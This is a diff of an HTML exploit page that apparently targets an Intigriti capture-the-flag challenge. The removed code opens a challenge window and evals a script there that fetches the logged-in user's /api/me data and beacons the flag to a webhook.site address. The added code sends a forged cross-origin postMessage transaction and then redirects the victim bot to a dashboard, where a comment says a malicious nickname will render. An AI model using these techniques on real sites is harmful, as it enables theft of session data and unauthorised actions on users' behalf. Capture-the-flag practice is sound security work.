@@ -1,24 +1,33 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Exploit</title>
+</head>
 <body>
-<script>
-const win = window.open(
-  "https://challenge-0126.intigriti.io/security.html"
-);
+    <h1>Processing... Please wait.</h1>
+    <script>
+        // Open the vulnerable buy page in a new window/tab
+        const targetUrl = "https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1";
+        const challengeWin = window.open(targetUrl);
 
-setTimeout(() => {
-  win.eval(`
-    fetch('/api/me',{credentials:'include'})
-      .then(r=>r.json())
-      .then(d=>{
-        if(d.flag){
-          new Image().src =
-            'https://webhook.site/3ae6a321-e1df-47a0-b4d3-ac23c1e28963?flag='
-            + encodeURIComponent(d.flag);
-        }
-      });
-  `);
-}, 3000);
-</script>
+        // We need to wait for the page and wallets to load
+        setTimeout(() => {
+            console.log("Sending postMessage...");
+            challengeWin.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: 'INTIGRITI-EXPLOIT',
+                    currency: '1337COIN',
+                    amount: 0.0001
+                }
+            }, '*');
+
+            // After the transaction is sent, redirect the bot to the dashboard
+            // where your malicious nickname will be rendered.
+            setTimeout(() => {
+                challengeWin.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
+            }, 1500);
+        }, 3000); // 3 seconds to ensure the bot is fully logged in and wallets loaded
+    </script>
 </body>
 </html>
